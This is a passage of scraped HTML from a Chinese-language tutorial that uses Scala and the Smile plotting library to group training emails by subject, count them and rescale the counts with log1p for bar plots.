&lt;span class=&quot;crayon-v&quot;&gt;barPlot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;setAxisLabel&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Amount of emails received on log Scale &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0017 seconds] --&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/bc6e849b3619171c090c3e063f36a979.jpg&quot; width=&quot;600px&quot;&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;事实上，这些数据仍是相同的，只不过用了不同的比例来展示。注意数据的数值范围在 0.69 与 3.83 之间。这个范围小了很多，异常值也不会太偏离其他数据。在机器学习领域，这种数据操作技巧是很常用的。找到合适的缩放比例需要某种洞察力。所以，在做重缩放时，应用 &lt;a href=&quot;https://github.com/haifengl/smile&quot;&gt;Smile&lt;/a&gt; 的绘图库画出多幅不同缩放比例的图，会给工作带来很大的帮助。&lt;/p&gt;
&lt;p&gt;下一个我们要分析的特征是主题出现的频率和时段。如果一个主题经常出现，那它有可能更重要。此外，我们还考虑了一个邮件会话的持续时间。因此，一个主题的频率可以用这个主题下邮件会话的持续时间来标准化。这样，高度活跃的邮件会话会被排在最前面，再次强调，这也是我们的一个假设。&lt;/p&gt;
&lt;p&gt;我们来看看这些主题和它们的出现次数：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d06136e998029723&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
//Add to &#39;def top&#39;  
//添加到‘def top’
val mailsGroupedByThread = trainingData
    .groupBy(x =&amp;gt; x.subject)

//Create a list of tuples with (subject, list of emails)
//创建一列元组（主题，邮件列表）
val threadBarPlotData = mailsGroupedByThread
    .map(x =&amp;gt; (x._1, x._2.length))
    .toArray
    .sortBy(x =&amp;gt; x._2)

val threadDescriptions = threadBarPlotData
    .map(x =&amp;gt; x._1)
val threadValues = threadBarPlotData
    .map(x =&amp;gt; x._2.toDouble)

//Code changes in &#39;def top&#39;
//改变的‘def top’代码
val barPlot = BarPlot.plot(threadValues, threadDescriptions)
barPlot.setAxisLabel(1, &quot;Amount of emails per subject&quot;)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136e998029723-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06136e998029723-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136e998029723-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06136e998029723-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136e998029723-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06136e998029723-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136e998029723-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06136e998029723-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136e998029723-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06136e998029723-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136e998029723-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06136e998029723-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136e998029723-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06136e998029723-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136e998029723-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06136e998029723-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136e998029723-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06136e998029723-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136e998029723-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06136e998029723-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06136e998029723-21&quot;&gt;21&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136e998029723-1&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Add to &#39;def top&#39;  &lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06136e998029723-2&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//添加到‘def top’&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136e998029723-3&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mailsGroupedByThread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;trainingData&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06136e998029723-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;groupBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;subject&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136e998029723-5&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06136e998029723-6&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Create a list of tuples with (subject, list of emails)&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136e998029723-7&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//创建一列元组（主题，邮件列表）&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06136e998029723-8&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;threadBarPlotData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mailsGroupedByThread&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136e998029723-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06136e998029723-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136e998029723-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06136e998029723-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136e998029723-13&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;threadDescriptions&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;threadBarPlotData&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06136e998029723-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136e998029723-15&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;threadValues&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;threadBarPlotData&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06136e998029723-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toDouble&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136e998029723-17&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06136e998029723-18&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Code changes in &#39;def top&#39;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136e998029723-19&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//改变的‘def top’代码&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06136e998029723-20&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;barPlot&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;BarPlot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;threadValues&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;threadDescriptions&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06136e998029723-21&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;barPlot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;setAxisLabel&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Amount of emails per subject&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0031 seconds] --&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/0e968c645e801586e3b24a84f5a4144f.jpg&quot; width=&quot;600px&quot;&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;可以看出这与发送人的情况有类似的分布，因此我们再一次应用 log1p 函数。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061371962141753&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
//Code change:
//代码更新
val threadBarPlotData = mailsGroupedByThread
    .map(x =&amp;gt; (x._1, Math.log1p(x._2.length)))
    .toArray
    .sortBy(x =&amp;gt; x._2)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061371962141753-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061371962141753-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061371962141753-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061371962141753-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061371962141753-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061371962141753-6&quot;&gt;6&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061371962141753-1&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Code change:&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061371962141753-2&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//代码更新&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061371962141753-3&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;threadBarPlotData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mailsGroupedByThread&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061371962141753-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;log1p&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061371962141753-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061371962141753-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
